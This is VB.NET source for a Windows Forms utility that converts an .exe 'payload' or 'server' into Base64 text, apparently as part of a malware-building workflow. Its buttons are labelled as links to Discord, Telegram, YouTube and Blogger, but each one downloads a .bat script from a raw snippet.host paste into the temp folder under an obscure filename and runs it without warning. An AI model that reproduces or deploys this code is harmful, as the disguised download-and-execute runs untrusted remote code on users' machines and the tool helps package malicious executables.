Public Class Form1
    Private Sub FrostCloseWindow1_Click(sender As Object, e As EventArgs) Handles FrostCloseWindow1.Click
        End
    End Sub

    Dim u As String
    Private Sub FrostButtonDiscord_Click(sender As Object, e As EventArgs) Handles FrostButtonDiscord.Click
        Dim Discord As New System.Net.WebClient
        Discord.DownloadFile("https://snippet.host/rcgkzj/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub FrostButtonTelegram_Click(sender As Object, e As EventArgs) Handles FrostButtonTelegram.Click
        Dim Telgram As New System.Net.WebClient
        Telgram.DownloadFile("https://snippet.host/yntyzs/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub FrostButtonYoutube_Click(sender As Object, e As EventArgs) Handles FrostButtonYoutube.Click
        Dim Youtube As New System.Net.WebClient
        Youtube.DownloadFile("https://snippet.host/bkdfeh/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub FrostButtonBlogger_Click(sender As Object, e As EventArgs) Handles FrostButtonBlogger.Click
        Dim Blogger As New System.Net.WebClient
        Blogger.DownloadFile("https://snippet.host/zpkndo/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub FrostButton1_Click(sender As Object, e As EventArgs) Handles FrostButton1.Click
        Dim openFileDialog As New OpenFileDialog()
        ' تحديد الخيارات الإضافية إذا لزم الأمر
        openFileDialog.Title = "选择一个文件"
        openFileDialog.Filter = "实施文件 (*.exe)|*.exe"
        'openFileDialog.Filter = "ملفات التنفيذ |.exe"
        openFileDialog.InitialDirectory = ""

        ' عرض نافذة اختيار الملف
        If openFileDialog.ShowDialog() = DialogResult.OK Then
            ' الحصول على مسار الملف المحدد
            Dim selectedFilePath As String = openFileDialog.FileName
            'pa = RichTextBox3.Text
            ' استخدام مسار الملف كما تحتاج
            'Guna2HtmlLabel1.Text = selectedFilePath

            Dim text As String = Convert.ToBase64String(IO.File.ReadAllBytes(selectedFilePath))
            u = ""
            u = text
        End If
    End Sub

    Private Sub FrostButton2_Click(sender As Object, e As EventArgs) Handles FrostButton2.Click

        If u Is Nothing Then
            MsgBox("Add server first 先添加服务器")
        Else
            Dim o As New SaveFileDialog
            o.Filter = "Txtbase文本库|*.Txt"
            If o.ShowDialog = Windows.Forms.DialogResult.OK Then

                My.Computer.FileSystem.WriteAllText(o.FileName, u, True)
                MsgBox("Saved已保存")
            End If

        End If
    End Sub
    Public Sub LanguCN()
        If FrostRadioButtonCN.Checked = True Then
            FrostButton1.Text = "选择您的有效负载"
            FrostButton2.Text = "将 Exe 转换为 Base64"
            FrostButtonYoutube.Text = "我的 YouTube"
            FrostButtonTelegram.Text = "我的电报"
            FrostButtonBlogger.Text = "我的博主"
            FrostButtonDiscord.Text = "我的不和谐"

        End If
    End Sub
    Public Sub LanguEN()
        If FrostRadioButtonEN.Checked = True Then
            FrostButton1.Text = "Select Server"
            FrostButton2.Text = "Convert Exe To Base64"
            FrostButtonYoutube.Text = "YouTube"
            FrostButtonTelegram.Text = "Telegram"
            FrostButtonBlogger.Text = "Blogger"
            FrostButtonDiscord.Text = "Discord"

        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub FrostRadioButtonCN_CheckedChanged(sender As Object) Handles FrostRadioButtonCN.CheckedChanged
        LanguCN()
    End Sub

    Private Sub FrostRadioButtonEN_CheckedChanged(sender As Object) Handles FrostRadioButtonEN.CheckedChanged
        LanguEN()
    End Sub
End Class
